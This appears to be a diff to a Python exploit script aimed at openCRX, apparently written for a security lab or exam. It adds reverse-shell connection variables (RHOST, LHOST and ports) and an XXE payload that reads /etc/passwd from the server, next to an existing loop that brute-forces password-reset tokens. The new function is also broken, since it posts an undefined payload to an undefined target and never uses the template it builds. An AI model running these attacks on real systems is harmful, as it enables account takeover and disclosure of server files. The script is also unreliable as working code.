@@ -4,6 +4,13 @@ import requests
 import argparse
 import subprocess
 
+
+RHOST = ""
+RPORT = ""
+LHOST = ""
+LPORT = ""
+s = requests.session()
+
 def execute_bash_command(command):
     try:
         result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -77,6 +84,12 @@ def resetPassword():
             if "Unable to reset password" not in res:
                 print("Successful reset with token: %s" % word)
                 break
+
+def xxe():
+    xxeTemplate = '''<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY ><!ENTITY lastname SYSTEM "file:///etc/passwd">]><org.opencrx.kernel.account1.Contact><lastName>&lastname;</lastName><firstName>Tom</firstName></org.opencrx.kernel.account1.Contact>'''
+    response = s.post(url=target, data=payload)
+    responseValue = response.text
+
 
 
 startTime, stoptime = getEpochTime()
